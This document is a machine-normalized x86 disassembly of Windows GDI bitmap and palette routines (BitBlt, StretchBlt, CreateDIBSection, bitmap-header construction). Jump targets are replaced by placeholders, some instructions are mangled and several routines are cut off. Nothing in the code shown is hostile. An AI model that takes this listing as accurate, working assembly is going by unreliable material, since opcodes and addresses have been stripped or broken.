mov ecx esi
mov edx esi
mov eax ebx
call sub_420728
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_420ffc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41fe58
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_420554
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_421064
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_421774
mov eax [ esi + 0x28 ]
call sub_420558
mov eax [ esi + 0x2c ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414740
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4210a0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_421158
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4219e4
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_420554
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_420558
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41476c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_421190
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_421774
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42121f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_420d8c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_420728
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4219e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421224
mov eax [ ebp - 0x8 ]
call sub_41cc28
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a30
call sub_403a84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_421250
push ebx
mov ebx eax
mov eax ebx
call sub_421544
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d19c
pop ebx
retn
sub_421280
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4166b0
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_421774
lea eax [ ebx + 0x2c ]
call sub_40d19c
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4219e4
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4212f4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41e9d8
mov eax ebx
call sub_421884
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_421680
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_421530
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call SetStretchBltMode
mov eax ebx
call sub_4215c4
mov dl [ r-xdata ]
call sub_41e9d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_421824
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4215c4
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421537
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4214c5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4215c4
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41ee94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_421544
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_421784
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421190
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41ec48
sub_4215c4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_421784
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_420360
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_421250
sub_42160c
push ebx
mov ebx eax
mov eax ebx
call sub_421774
mov eax ebx
call sub_421784
mov edx ebx
mov eax ebx
call sub_421250
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_421630
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4216b0
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41d4f8
mov eax ebx
call sub_421680
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4215c4
xor edx edx
pop ecx
call sub_41e890
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_421700
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_421884
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_420728
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_421784
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41664c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_421807
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_421824
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_421774
mov eax ebx
call sub_421784
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4216b0
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_420df0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4202e4
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_421884
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41f3e0
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4202e4
push 0x0
call GetDC
call sub_41ecf0
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_42193c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41ebc4
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_421190
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_421774
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4219c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41662c
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_422074
pop esi
pop ebx
retn
sub_4219e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421a6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403444
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_421acb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_420558
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_420554
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ad2
push rw-data
call LeaveCriticalSection
retn
sub_421ae4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_422074
pop edx
pop edi
pop esi
pop ebx
retn
sub_421b0c
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026e4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422029
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_421ffc
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402ca4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41ebdc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4168c8
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402ca4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_416858
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41ee60
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41ee80
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_416858
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41ecf0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_421f77
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41f128
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026e4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_421edf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_416858
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41ecf0
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_421eb3
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41f3e0
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cb00
call sub_41ebdc
jmp r-xdata
xor eax eax
push ebp
push sub_421f46
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_416858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421eba
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421f7e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cb00
call sub_41ebdc
jmp r-xdata
sub_421eba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402704
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_421f7e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
